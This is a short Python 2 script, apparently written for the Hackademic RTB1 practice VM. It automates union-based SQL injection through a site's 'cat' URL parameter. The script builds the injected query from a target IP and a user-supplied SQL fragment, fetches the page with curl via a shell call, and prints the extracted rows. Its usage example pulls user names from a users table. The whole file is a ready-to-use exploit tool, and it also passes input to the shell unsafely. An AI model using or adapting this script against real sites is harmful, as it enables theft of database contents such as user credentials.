#!/usr/bin/env python

__author__ = 'UB3RSiCK'
__description__ = 'HackademicRTB1 SQLi Script'

import subprocess
import sys

print '#'*60
for i in range(6):
	if i == 2:
		print '#'+' '*25 + __author__+' '*25+'#'
	elif i ==3:
		print '#'+' '*16 + __description__ +' '*16+'#'
	else:
		print '#'+' '*58+'#'
print '#'*60

if len(sys.argv) == 3:
	target = sys.argv[1]
	sql = sys.argv[2].split()
	temp = ''
	url = 'http://{0}/Hackademic_RTB1/?cat=1+and+sleep(0)+union+select+1,{1},3,4,5'.format(target,sql[0])
	sql.pop(0)
	for query in sql:
		temp += '+'+query
	url +=temp
	print '\n'+url  
	command = "curl -s '{}' | grep Archive | cut -d';' -f2 | cut -d'&' -f1".format(url)
	#print command
	results = subprocess.check_output(command, shell=True)
	print '\n'
	for result in results.split(','):
		print '\t'+result
else:
	print '\n\t"Donot add select query before any query you write'
	print '\tits already there in the source code"'
	print '\n\tIf you intent to execute query "select uname from users"'
	print '\twrite it like this'
	print '\teg: "uname from users"'
	print '\n\tprovide arguments:\n\t{} target_ip sql_query(within quotes)\n'.format(sys.argv[0])
	print "\teg: {} 192.168.0.1 'uname from users'".format(sys.argv[0])





